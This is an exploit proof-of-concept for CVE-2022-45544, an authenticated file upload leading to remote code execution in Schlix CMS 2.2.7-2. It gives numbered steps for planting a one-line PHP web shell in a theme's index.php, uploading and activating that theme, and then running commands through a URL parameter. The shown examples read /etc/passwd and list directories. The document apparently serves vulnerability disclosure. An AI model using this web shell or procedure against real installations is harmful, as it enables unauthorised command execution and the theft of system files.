# CVE-2022-45544
## SCHLIX CMS 2.2.7-2 arbitrary File Upload

#Title:Schlix CMS 2.2.7-2 | Arbitrary File Upload Remote following Code Execution (Authenticated)<br>
#Date: 2022-11-09<br>
#Author: Francisco Marinho<br>
#Vendor Homepage: https://www.schlix.com/<br>
#Software link:https://www.schlix.com/downloads/schlix-cms/schlix-cms-v2.2.7-2.zip<br>
#Version: 2.2.7-2<br>
#Tested on: Linux<br>
<br>
# =========================POC=========================<br>
<br>

1 - Login with your account<br>
2 - Acess the directory in url http://example.com/admin/app/core.thememanager <br>
3 - Download theme Superhero in https://www.schlix.com/extensions.releases/action/download/filename/theme_superhero-1.1.zip<br>
4 - Unzip theme_superhero-1.1.zip<br>
5 - Edit file in path superhero/themes/superhero/index.php, adding "system($_GET['tristao']);" on line three.<br>
6 - Zip theme_superhero-1.1.zip<br>
7 - Click in "INSTALL A PACKAGE"<br>
8 - Upload theme_superhero-1.1.zip<br>
9 - Active theme superhero<br>
10 - Acess homepage index.php<br>
<br>
## Examples:

cat /etc/passwd<br>

http://example.com/index.php?tristao=cat%20%20/etc/passwd<br>

ls -la <br>

http://example.com/index.php?tristao=ls%20%20-la<br>

Procedure video<br>
https://www.youtube.com/watch?v=_0X6AzXmhrU&t=36s
